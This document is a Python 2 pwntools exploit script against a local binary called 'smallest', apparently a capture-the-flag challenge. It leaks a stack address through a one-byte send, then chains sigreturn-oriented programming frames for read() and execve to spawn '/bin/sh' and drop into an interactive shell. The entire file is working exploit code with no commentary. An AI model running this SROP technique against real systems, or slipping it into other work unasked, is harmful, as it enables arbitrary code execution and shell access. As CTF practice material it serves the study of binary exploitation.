#coding=utf8
from pwn import *
sh = process('./smallest')
small = ELF('./smallest')
context.arch = 'amd64'
syscall_ret = 0x00000000004000BE
start_addr = 0x00000000004000B0
payload = p64(start_addr) * 3
sh.send(payload)
sh.send('\xb3')

stack_addr = u64(sh.recv()[8:16])

log.success('leak stack addr :' + hex(stack_addr))

read = SigreturnFrame()
read.rax = constants.SYS_read
read.rdi = 0
read.rsi = stack_addr
read.rdx = 0x400
read.rsp = stack_addr
read.rip = syscall_ret

read_frame_payload  = p64(start_addr) + p64(syscall_ret) + str(read)
sh.send(read_frame_payload)
sh.send(read_frame_payload[8:8+15])

execve = SigreturnFrame()
execve.rax=constants.SYS_execve
execve.rdi=stack_addr + 0x120
execve.rsi=0x0
execve.rdx=0x0
execve.rsp=stack_addr
execve.rip=syscall_ret
execv_frame_payload=p64(start_addr)+p64(syscall_ret)+str(execve)
print len(execv_frame_payload)
execv_frame_payload_all=execv_frame_payload+(0x120-len(execv_frame_payload ))*'\x00'+'/bin/sh\x00'
sh.send(execv_frame_payload_all)
sh.send(execv_frame_payload_all[8:8+15])
sh.interactive()
